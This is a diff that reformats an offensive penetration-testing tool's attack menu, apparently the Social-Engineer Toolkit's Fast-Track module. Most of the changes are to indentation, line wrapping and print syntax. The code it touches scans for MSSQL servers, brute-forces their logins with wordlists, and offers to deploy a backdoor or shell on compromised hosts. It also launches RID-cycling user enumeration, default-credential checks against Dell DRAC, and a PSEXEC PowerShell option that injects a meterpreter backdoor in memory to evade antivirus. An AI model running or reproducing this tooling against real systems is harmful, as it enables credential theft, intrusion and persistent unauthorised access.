@@ -12,9 +12,9 @@ definepath = os.getcwd()
 #
 try:
     while 1:
-        ###################################################
-        #        USER INPUT: SHOW WEB ATTACK MENU         #
-        ###################################################
+        #
+        # USER INPUT: SHOW WEB ATTACK MENU         #
+        #
 
         create_menu(text.fasttrack_text, text.fasttrack_menu)
         attack_vector = raw_input(setprompt(["19"], ""))
@@ -22,11 +22,11 @@ try:
         if attack_vector == "99" or attack_vector == "quit" or attack_vector == "exit":
             break
 
-        ##################################
-        ##################################
+        #
+        #
         # mssql_scanner
-        ##################################
-        ##################################
+        #
+        #
         if attack_vector == "1":
             # start the menu
             create_menu(text.fasttrack_mssql_text1, text.fasttrack_mssql_menu1)
@@ -38,7 +38,8 @@ try:
             # if 1, start scan and attack
             #
             if attack_vector_sql == '1':
-                print("\nHere you can select either a CIDR notation/IP Address or a filename\nthat contains a list of IP Addresses.\n\nFormat for a file would be similar to this:\n\n192.168.13.25\n192.168.13.26\n192.168.13.26\n\n1. Scan IP address or CIDR\n2. Import file that contains SQL Server IP addresses\n")
+                print(
+                    "\nHere you can select either a CIDR notation/IP Address or a filename\nthat contains a list of IP Addresses.\n\nFormat for a file would be similar to this:\n\n192.168.13.25\n192.168.13.26\n192.168.13.26\n\n1. Scan IP address or CIDR\n2. Import file that contains SQL Server IP addresses\n")
                 choice = raw_input(
                     setprompt(["19", "21", "22"], "Enter your choice (ex. 1 or 2) [1]"))
                 if choice != "1":
@@ -91,37 +92,43 @@ try:
                     print_status(
                         "Hunting for SQL servers.. This may take a little bit.")
                     if "/" or " " in str(range):
-			if "/" in str(range):
-	                        iprange = printCIDR(range)
-	                        iprange = iprange.split(",")
-	                        for host in iprange:
-	                            sqlport = get_sql_port(host)
-				    if sqlport == None:
-					sql_nmap_scan(host)
-					if sql_nmap_scan != None:
-						sql_servers = sql_servers + host + ":" + "1433" + ","
-	                            if sqlport != None:
-	                                sql_servers = sql_servers + host + ":" + sqlport + ","
-			else:
-				range1 = range.split(" ")
-				for ip in range1:
-					sqlport = get_sql_port(ip)
-                                    	if sqlport == None:
-                                        	sql_nmap_scan(ip)
-                                        	if sql_nmap_scan != None:
-                                                	sql_servers = sql_servers + ip + ":" + "1433" + ","
+                        if "/" in str(range):
+                            iprange = printCIDR(range)
+                            iprange = iprange.split(",")
+                            for host in iprange:
+                                sqlport = get_sql_port(host)
+                                if sqlport == None:
+                                    sql_nmap_scan(host)
+                                    if sql_nmap_scan != None:
+                                        sql_servers = sql_servers + \
+                                            host + ":" + "1433" + ","
+                                if sqlport != None:
+                                    sql_servers = sql_servers + \
+                                        host + ":" + sqlport + ","
+                        else:
+                            range1 = range.split(" ")
+                            for ip in range1:
+                                sqlport = get_sql_port(ip)
+                                if sqlport == None:
+                                    sql_nmap_scan(ip)
+                                    if sql_nmap_scan != None:
+                                        sql_servers = sql_servers + \
+                                            ip + ":" + "1433" + ","
 
-					if sqlport != None:
-						sql_servers = sql_servers + ip + ":" + sqlport + ","
+                                if sqlport != None:
+                                    sql_servers = sql_servers + \
+                                        ip + ":" + sqlport + ","
 
                     else:
                         # use udp discovery to get the SQL server UDP 1434
                         sqlport = get_sql_port(range)
-                        # if its not closed then check nmap - if both fail then nada
+                        # if its not closed then check nmap - if both fail then
+                        # nada
                         if sqlport == None:
-                        	sql_nmap_scan(host)
-                        	if sql_nmap_scan != None:
-                        		sql_servers = sql_servers + host + ":" + "1433" + ","
+                            sql_nmap_scan(host)
+                            if sql_nmap_scan != None:
+                                sql_servers = sql_servers + \
+                                    host + ":" + "1433" + ","
                         if sqlport != None:
                             sql_servers = range + ":" + sqlport
 
@@ -168,10 +175,11 @@ try:
                                 sql_success = mssql.brute(
                                     servers, username, port, wordlist)
                                 if sql_success != False:
-                                    # after each success or fail it will break
-                                    # into this to the above with a newline to
-                                    # be parsed later
-                                    master_list = master_list + sql_success + ":"
+                                # after each success or fail it will break
+                                # into this to the above with a newline to
+                                # be parsed later
+                                    master_list = master_list + \
+                                        sql_success + ":"
                                     counter = 1
 
                             # if we specified a username list
@@ -183,18 +191,22 @@ try:
                                     # we wont break out of the loop here incase
                                     # theres multiple usernames we want to find
                                     if sql_success != False:
-                                        master_list = master_list + sql_success + ":"
+                                        master_list = master_list + \
+                                            sql_success + ":"
                                         counter = 1
 
                 # if we didn't successful attack one
                 if counter == 0:
-		    if sql_servers:
-                    	print_warning("Sorry. Unable to locate or fully compromise a MSSQL Server on the following SQL servers: ")
-			for line in sql_servers: 
-				if line != "":
-					print "SQL Server: " + line.rstrip()
+                    if sql_servers:
+                        print_warning(
+                            "Sorry. Unable to locate or fully compromise a MSSQL Server on the following SQL servers: ")
+                        for line in sql_servers:
+                            if line != "":
+                                print("SQL Server: " + line.rstrip())
 
-		    else: print_warning("Sorry. Unable to find any SQL servers to attack.")
+                    else:
+                        print_warning(
+                            "Sorry. Unable to find any SQL servers to attack.")
                     pause = raw_input(
                         "Press {return} to continue to the main menu.")
                 # if we successfully attacked one
@@ -205,10 +217,11 @@ try:
                         counter = 1
                         # here we list the servers we compromised
                         master_names = master_list.split(":")
-			print_status("SET Fast-Track attacked the following SQL servers: ")
-			for line in sql_servers:
-				if line != "": 	
-					print "SQL Servers: " + line.rstrip()
+                        print_status(
+                            "SET Fast-Track attacked the following SQL servers: ")
+                        for line in sql_servers:
+                            if line != "":
+                                print("SQL Servers: " + line.rstrip())
                         print_status(
                             "Below are the successfully compromised systems.\nSelect the compromise SQL server you want to interact with:\n")
                         for success in master_names:
@@ -239,8 +252,10 @@ try:
                                 success = success.split(",")
                                 # if we equal the number used above
                                 if counter == int(select_server):
-                                        #  ipaddr + "," + username + "," + str(port) + "," + passwords
-                                    print("\nHow do you want to deploy the binary via debug (win2k, winxp, win2003) and/or powershell (vista,win7,2008,2012) or just a shell\n\n   1. Deploy Backdoor to System\n   2. Standard Windows Shell\n\n   99. Return back to the main menu.\n")
+                                # ipaddr + "," + username + "," + str(port) +
+                                # "," + passwords
+                                    print(
+                                        "\nHow do you want to deploy the binary via debug (win2k, winxp, win2003) and/or powershell (vista,win7,2008,2012) or just a shell\n\n   1. Deploy Backdoor to System\n   2. Standard Windows Shell\n\n   99. Return back to the main menu.\n")
                                     option = raw_input(
                                         setprompt(["19", "21", "22"], "Which deployment option do you want [1]"))
                                     if option == "":
@@ -325,11 +340,11 @@ try:
                             print_warning(
                                 "\nIncorrect syntax somewhere. Printing error message: " + str(e))
 
-        ##################################
-        ##################################
+        #
+        #
         # exploits menu
-        ##################################
-        ##################################
+        #
+        #
         if attack_vector == "2":
             # start the menu
             create_menu(text.fasttrack_exploits_text1,
@@ -377,11 +392,11 @@ try:
                 except:
                     import src.fasttrack.exploits.f5
 
-        ##################################
-        ##################################
+        #
+        #
         # sccm attack menu
-        ##################################
-        ##################################
+        #
+        #
         if attack_vector == "3":
             # load sccm attack
             try:
@@ -389,21 +404,21 @@ try:
             except:
                 import src.fasttrack.sccm.sccm_main
 
-        ##################################
-        ##################################
+        #
+        #
         # dell drac default credential checker
-        ##################################
-        ##################################
+        #
+        #
         if attack_vector == "4":
             # load drac menu
             subprocess.Popen("python %s/src/fasttrack/delldrac.py" %
                              (definepath), shell=True).wait()
 
-        ##################################
-        ##################################
+        #
+        #
         # RID ENUM USER ENUMERATION
-        ##################################
-        ##################################
+        #
+        #
         if attack_vector == "5":
             print (""".______       __   _______         _______ .__   __.  __    __  .___  ___.
 |   _  \     |  | |       \       |   ____||  \ |  | |  |  |  | |   \/   |
@@ -413,7 +428,8 @@ try:
 | _| `._____||__| |_______/  _____|_______||__| \__|  \______/  |__|  |__|
                 |______|
 """)
-            print("\nRID_ENUM is a tool that will enumerate user accounts through a rid cycling attack through null sessions. In\norder for this to work, the remote server will need to have null sessions enabled. In most cases, you would use\nthis against a domain controller on an internal penetration test. You do not need to provide credentials, it will\nattempt to enumerate the base RID address and then cycle through 500 (Administrator) to whatever RID you want.")
+            print(
+                "\nRID_ENUM is a tool that will enumerate user accounts through a rid cycling attack through null sessions. In\norder for this to work, the remote server will need to have null sessions enabled. In most cases, you would use\nthis against a domain controller on an internal penetration test. You do not need to provide credentials, it will\nattempt to enumerate the base RID address and then cycle through 500 (Administrator) to whatever RID you want.")
             print("\n")
             ipaddr = raw_input(
                 setprompt(["31"], "Enter the IP address of server (or quit to exit)"))
@@ -466,13 +482,14 @@ try:
             print_status("Everything is finished!")
             pause = raw_input("Press {return} to go back to the main menu.")
 
-        ##################################
-        ##################################
+        #
+        #
         # PSEXEC PowerShell
-        ##################################
-        ##################################
+        #
+        #
         if attack_vector == "6":
-            print("\nPSEXEC Powershell Injection Attack:\n\nThis attack will inject a meterpreter backdoor through powershell memory injection. This will circumvent\nAnti-Virus since we will never touch disk. Will require Powershell to be installed on the remote victim\nmachine. You can use either straight passwords or hash values.\n")
+            print(
+                "\nPSEXEC Powershell Injection Attack:\n\nThis attack will inject a meterpreter backdoor through powershell memory injection. This will circumvent\nAnti-Virus since we will never touch disk. Will require Powershell to be installed on the remote victim\nmachine. You can use either straight passwords or hash values.\n")
             try:
                 module_reload(src.fasttrack.psexec)
             except:
